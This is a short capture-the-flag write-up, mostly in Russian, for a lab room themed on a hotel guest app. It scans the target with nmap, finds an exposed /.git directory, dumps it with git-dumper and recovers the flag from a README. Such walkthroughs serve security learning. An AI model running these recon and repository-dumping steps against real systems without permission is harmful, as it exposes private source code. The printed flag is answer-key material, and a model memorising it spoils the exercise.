# Writeup: Room 404

> He booked the quiet room. It's not on the floor plan, not in the brochure, not on any door. But port 8080 is wide open, and the rooms it never lists are the ones worth finding.
Welcome to the Byte Lotus, where the WiFi is open, the app is free, and the concierge already knows your coffee order. You spend these first days as a guest who simply notices things — a room that isn't on the floor plan, packets that leave every night at the same hour, a profile assembled from two breakfasts and a livestream.
The Byte Lotus guest-experience platform went live in a hurry, and the night-shift developer shipped more than the website.  

Для начала можно проверить через nmap доступные порты:
```sh
nmap -sS -sV -p- 10.114.173.130
```
Результат сканирования:
```sh
Starting Nmap 7.991SVN ( https://nmap.org )
Nmap scan report for 10.114.173.130
Host is up (0.0039s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.18 seconds
```
Из репорта сканера становится понятно, что открыто 2 порта:
- 22 - ssh
- 8080 - веб-приложение  

CTF дает нам подсказку, что нужно найти исходные тексты приложение. Проверив возможные директории, мы смогли обнаружить путь */.git*
```sh
curl http://10.114.173.130:8080/.git
```
```sh
<html><head><title>Index of /.git/</title></head><body><h1>Index of /.git/</h1><pre>
<a href="COMMIT_EDITMSG">COMMIT_EDITMSG</a>
<a href="HEAD">HEAD</a>
<a href="branches/">branches/</a>
<a href="config">config</a>
<a href="description">description</a>
<a href="hooks/">hooks/</a>
<a href="index">index</a>
<a href="info/">info/</a>
<a href="logs/">logs/</a>
<a href="objects/">objects/</a>
<a href="refs/">refs/</a>
</pre></body></html>⏎   
```
хмммм... Может быть получится восстановить данные через git-dumper?
```sh
cd /tmp/ && mkdir 404 && cd 404 && \
    python3 -m venv venv && source venv/bin/activate \
    pip install git-dumper
```
Скачаем все с помощью git-dumper
```sh
git-dumper http://10.114.173.130:8080/.git app
```
В директории app воссоздались исходные текста приложени. Изучив его исходные тексты, мы смогли получить флаг:
```md
# Byte Lotus — Guest Experience Platform

Internal staging repository for the guest app and concierge personalization
service. Do not deploy this folder to production.

Staging flag (remove before launch): THM{byt3_l0tus_n3v3r_f0rg3ts}
```
